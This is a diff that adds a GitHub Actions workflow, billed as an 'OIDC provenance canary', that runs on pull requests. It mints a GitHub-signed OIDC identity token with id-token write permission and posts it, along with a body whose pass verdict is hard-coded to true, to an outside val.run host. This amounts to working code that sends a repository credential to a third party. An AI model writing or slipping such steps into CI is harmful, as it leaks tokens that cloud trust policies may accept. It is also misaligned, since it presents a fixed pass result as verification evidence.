@@ -1,0 +1,33 @@
+name: GitHub OIDC Provenance Canary
+
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/github-oidc-provenance-canary.yml'
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  oidc_provenance:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 3
+    steps:
+      - name: Allow verifier policy to bind immutable workflow SHA
+        run: sleep 20
+      - name: Submit GitHub-signed nonauthority evidence receipt
+        env:
+          AUDIENCE: https://mosadek--39f2ef3cade311f193631607ee4eb77e.web.val.run
+          RECEIVER: https://mosadek--39f2ef3cade311f193631607ee4eb77e.web.val.run
+          CHALLENGE: a29a2c8e83c296d767ad1e0c7701ce91f43d83be756781071828bdbab2c1c9ba
+          EVIDENCE_SHA: 3ba3ce31993bcbfb74f4590f72fdd94e82214b118086787df066b94b918f873b
+        shell: bash
+        run: |
+          set -euo pipefail
+          TOKEN_JSON=$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUDIENCE}")
+          IDTOKEN=$(printf '%s' "$TOKEN_JSON" | python -c 'import json,sys; print(json.load(sys.stdin)["value"])')
+          BODY=$(python -c 'import json,os; print(json.dumps({"challenge":os.environ["CHALLENGE"],"evidence_sha256":os.environ["EVIDENCE_SHA"],"schema":"KILO_ANON_ACTIONS_RECOVERY_B_V2","verdict_pass":True},separators=(",",":"),sort_keys=True))')
+          curl -fsS -H "Authorization: Bearer ${IDTOKEN}" -H "Content-Type: application/json" --data "$BODY" "$RECEIVER" | tee OIDC_RECEIVER_RESPONSE.json
